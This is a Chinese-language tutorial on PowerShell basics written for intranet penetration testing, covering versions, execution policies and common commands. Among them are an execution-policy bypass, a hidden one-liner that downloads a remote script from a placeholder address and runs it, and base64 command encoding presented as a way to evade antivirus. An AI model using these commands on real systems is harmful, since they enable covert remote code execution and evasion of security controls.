# Windows Powershell 基础

**可以把PowerShell 当作是CMD的扩展，它可以执行一些脚本文件，极大的便利了内网渗透**

**优点：**

- 在Windows 7 以上的版本默认安装
- 脚本可以在内存中运行，无需写入内存
- 几乎不会触发杀毒软件
- 可以远程执行
- 目前很多工具多是基于PowerShell开发的
- 使Windows脚本执行变得更加容易
- `cmd.exe`通常会被阻止，但是`PowerShell`的运行通常不会被阻止

- 可用于管理活跃目录

**Windows版本对应的版本：**

| win版本                  | PowerShell版本 | 是否可以升级 |
| ------------------------ | -------------- | ------------ |
| win7/winServer 2008      | 2.0            | 3.0 / 4.0    |
| win8 / winServer 2021    | 3.0            | 4.0          |
| win8.1 / winServer2012R2 | 4.0            | X            |

- `Get-Host` 或者 `$PSVersionTable.PSVERSION` 查看版本

![image-20220330095144552](https://husins.oss-cn-beijing.aliyuncs.com/image-20220330095144552.png)

![image-20220330095234964](https://husins.oss-cn-beijing.aliyuncs.com/image-20220330095234964.png)

## 基本概念

- `Powershell`脚本文件的后缀是`.ps1`

## 执行策略

为了防止恶意脚本执行，提供了执行策略，默认策略是"不能运行"

- 使用`Get-ExecutionPolicy`查看执行策略

  - `Restricted`：脚本不能执行（默认设置）

  - `RemoteSigned:`在本地创建的脚本可以运行，网上下载的脚本不能运行（拥有数字签名的证书除外）

  - `AllSigned:` 仅当脚本有受信任的发布者签名时才能运行
  - `Unrestricted:`允许所有脚本运行

  ![image-20220330100120858](https://husins.oss-cn-beijing.aliyuncs.com/image-20220330100120858.png)

- 使用`Set-ExecutionPolicy <policy name>` 设置执行策略（需要管理员权限）

## 常用命令

 ```powershell
 New-Item <目录名> -type directory # 新建目录
 New-Item <文件名> -type file      # 新建文件
 Remove-item <目录名/文件名>        # 删除目录或者文件
 Get-content <文件名>              # 读取文件内容
 set-content <文件名> -value "文件内容" # 覆盖写入文件内容
 add-content <文件名> -value "文件内容" # 追加写入文件内容
 clear-content <文件名>            # 清空文件内容
 $host.version  # 查看powershell版本
 set-location <绝对路径> # 设置路径
 powershell  # cmd切换为powershell
 powershell.exe -exec bypass -file .\1.ps1  # 绕过安全检测执行ps1文件
 powershell.exe -exec bypass -command "&{import-module <被引入模块的绝对路径>;<引入模块的执行名称>}"     # 在目标本地加载并执行
 powershell.exe -exec bypass -w hidden -Nop -Noni(New-Object Net.webClient).DownloadString("<远程脚本加载地址>"); #远程导入ps1脚本，绕过本地权限并执行，后面加执行参数就行了。
 ```

## 常用参数

```powershell
-exec bypass(-ExecutionPolicy Bypass): 绕过安全执行策略。
-W hidden (-WindowStyle Hidden): 隐藏窗口
-Noni(-NonInteractive): 非交互式。powershell不为用户提供交互式提示
-NoP(-NoProfile): Powershell控制台不加载当前用户的配置文件
-noexit：执行之后不退出shell，这个参数在使用键盘记录等脚本非常重要
-Nologo：启动不显示版权标志的Powershell
-enc: 解码base64,直接用在线的base64进行编码不可以，推荐使用下面的脚本，编码
```

```powershell
$fileContent = "<需要编码的内容>"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
$encodedCommand = [Convert]::ToBase64String($bytes)
echo $encodedCommand
```





























